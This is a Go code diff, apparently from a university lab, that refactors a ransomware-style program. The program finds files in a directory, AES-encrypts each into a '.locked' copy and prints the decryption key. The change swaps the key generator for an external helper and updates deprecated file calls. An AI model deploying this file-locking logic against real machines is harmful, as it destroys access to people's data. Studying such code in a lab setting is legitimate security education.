@@ -1,26 +1,15 @@
 package main
 
 import (
-	"crypto/rand"
+	"Laboratorio-3-Parte-4/scripts"
 	"encoding/hex"
 	"fmt"
-	"io/ioutil"
 	"os"
 	"path/filepath"
 	"strings"
 
 	"Laboratorio-3-Parte-4/algorithms"
 )
-
-func generateRandomKey(size int) []byte {
-	key := make([]byte, size)
-	_, err := rand.Read(key)
-	if err != nil {
-		fmt.Println("Error generando clave aleatoria:", err)
-		os.Exit(1)
-	}
-	return key
-}
 
 func findFiles(root string) ([]string, error) {
 	var files []string
@@ -38,9 +27,9 @@ func findFiles(root string) ([]string, error) {
 }
 
 func encryptFiles(files []string, key []byte) {
-	iv := generateRandomKey(16) // AES usa IV de 16 bytes
+	iv := scripts.DynamicKey(16) // AES usa IV de 16 bytes
 	for _, file := range files {
-		data, err := ioutil.ReadFile(file)
+		data, err := os.ReadFile(file)
 		if err != nil {
 			fmt.Println("Error leyendo archivo:", file, err)
 			continue
@@ -52,7 +41,7 @@ func encryptFiles(files []string, key []byte) {
 			continue
 		}
 
-		err = ioutil.WriteFile(file+".locked", encryptedData, 0644)
+		err = os.WriteFile(file+".locked", encryptedData, 0644)
 		if err != nil {
 			fmt.Println("Error escribiendo archivo cifrado:", file, err)
 		} else {
@@ -91,7 +80,7 @@ func main() {
 	}
 
 	// Generar clave de cifrado
-	key := generateRandomKey(32) // AES-256
+	key := scripts.DynamicKey(32) // AES-256
 	fmt.Println("Clave de descifrado (guárdala en un lugar seguro):", hex.EncodeToString(key))
 
 	encryptFiles(files, key)
